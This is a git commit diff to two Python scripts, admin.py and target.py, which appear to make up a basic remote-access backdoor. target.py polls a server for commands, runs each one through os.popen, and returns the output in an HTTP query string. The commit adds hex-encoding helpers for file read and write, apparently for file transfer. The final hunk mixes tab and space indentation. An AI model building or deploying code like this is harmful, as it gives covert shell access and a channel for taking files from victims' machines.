1a8efe2c5876e67486c8bec07219f16ca6d2213e
MARMARMOOZ <137816612+MARMARMOOZ@users.noreply.github.com>
2023-07-16 23:32:23 +0330

    updating codes

--- admin.py
+++ admin.py
@@ -3,6 +3,20 @@ from time import sleep
 url = ''
 prerespond = ""
 
+def read_file(file_url):
+    f = open(file_url,'rb')
+    content = f.read()
+    return content
+def write_file(file_url, content):
+    f = open('new_'+file_url,'wb')
+    f.write(content)
+    return '0'
+def encode_file(content):
+    hex = binascii.hexlify(content)
+    return hex.decode()
+def decode_file(encoded_content):
+    en = encoded_content.encode()
+    return binascii.unhexlify(en)
 
 while True:
 	code = input("code-->")
--- target.py
+++ target.py
@@ -1,9 +1,25 @@
 from requests import get
 from os import popen
 from time import sleep
+import binascii
+
 url = ''
 preid = 0
 
+def read_file(file_url):
+    f = open(file_url,'rb')
+    content = f.read()
+    return content
+def write_file(file_url, content):
+    f = open('new_'+file_url,'wb')
+    f.write(content)
+    return '0'
+def encode_file(content):
+    hex = binascii.hexlify(content)
+    return hex.decode()
+def decode_file(encoded_content):
+    en = encoded_content.encode()
+    return binascii.unhexlify(en)
 
 while True:
 	cde = get(url+'/gmecde')
@@ -24,6 +40,6 @@ while True:
 		continue
 	print('id: '+id)
 	print('cde: '+code)
-	respond = popen(code).read()
-	get(url+f'/target?respond={respond}&id={id}')
-	preid = id
+    respond = popen(code).read()
+    get(url+f'/target?respond={respond}&id={id}')
+    preid = id
